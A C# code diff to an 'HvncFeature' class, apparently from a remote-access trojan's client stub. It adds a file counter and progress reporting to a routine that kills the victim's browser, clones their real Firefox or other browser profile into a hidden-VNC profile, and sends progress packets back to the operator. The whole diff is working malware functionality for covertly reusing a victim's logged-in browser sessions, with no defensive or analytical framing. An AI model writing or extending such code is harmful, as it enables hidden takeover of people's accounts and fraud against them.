@@ -1630,7 +1630,22 @@ internal static class HvncFeature
         "cache2", "startupCache", "shader-cache", "thumbnails", "storage"
     };
 
-    private static void CloneProfileToDir(string src, string dst)
+    private static int CountProfileFiles(string src)
+    {
+        if (!Directory.Exists(src)) return 0;
+        int n = 0;
+        try { foreach (var _ in Directory.EnumerateFiles(src)) n++; } catch { }
+        try {
+            foreach (var dir in Directory.EnumerateDirectories(src))
+            {
+                if (_skipProfileDirs.Contains(Path.GetFileName(dir))) continue;
+                n += CountProfileFiles(dir);
+            }
+        } catch { }
+        return n;
+    }
+
+    private static void CloneProfileToDir(string src, string dst, int[]? progress = null)
     {
         if (!Directory.Exists(src)) return;
         Directory.CreateDirectory(dst);
@@ -1640,12 +1655,48 @@ internal static class HvncFeature
             catch (IOException) { }
             catch (UnauthorizedAccessException) { }
             catch { }
+            if (progress != null) Interlocked.Increment(ref progress[0]);
         }
         foreach (var dir in Directory.EnumerateDirectories(src))
         {
             if (_skipProfileDirs.Contains(Path.GetFileName(dir))) continue;
-            CloneProfileToDir(dir, Path.Combine(dst, Path.GetFileName(dir)));
+            CloneProfileToDir(dir, Path.Combine(dst, Path.GetFileName(dir)), progress);
         }
+    }
+
+    private static void CloneProfileWithProgress(string src, string dst, string label)
+    {
+        int total = CountProfileFiles(src);
+        if (total <= 0) { CloneProfileToDir(src, dst); return; }
+        var progress = new int[1];
+        using var cts = new System.Threading.CancellationTokenSource();
+        var reporter = new Thread(() =>
+        {
+            while (!cts.IsCancellationRequested)
+            {
+                int copied = Volatile.Read(ref progress[0]);
+                int pct = Math.Clamp(copied * 99 / total, 0, 99);
+                SendHvncProgress(pct, label);
+                Thread.Sleep(150);
+            }
+        }) { IsBackground = true, Name = "HvncProgressReporter" };
+        reporter.Start();
+        CloneProfileToDir(src, dst, progress);
+        cts.Cancel();
+        reporter.Join(500);
+        SendHvncProgress(100, label);
+    }
+
+    private static void SendHvncProgress(int pct, string label)
+    {
+        try
+        {
+            var json = JsonSerializer.Serialize(
+                new HvncProgressDataStub { Pct = pct, Label = label },
+                SeroJson.Default.HvncProgressDataStub);
+            _send?.Invoke((int)PacketType.HvncProgress, json).Wait(200);
+        }
+        catch { }
     }
 
     private static string? GetFirefoxRealProfile()
@@ -1930,7 +1981,7 @@ internal static class HvncFeature
                     KillProcessByName(exeBase);
                     Thread.Sleep(800);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
-                    CloneProfileToDir(realProfile, hvncProfile);
+                    CloneProfileWithProgress(realProfile, hvncProfile, $"Cloning {hvncDirName}...");
                     StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
                 }
                 else
@@ -1982,7 +2033,7 @@ internal static class HvncFeature
                     KillProcessByName("firefox.exe");
                     Thread.Sleep(800);
                     try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
-                    CloneProfileToDir(realProfile, hvncProfile);
+                    CloneProfileWithProgress(realProfile, hvncProfile, "Cloning firefox...");
                     StubLog.Info($"[HVNC] Firefox profile cloned '{realProfile}' → '{hvncProfile}'");
                 }
                 else
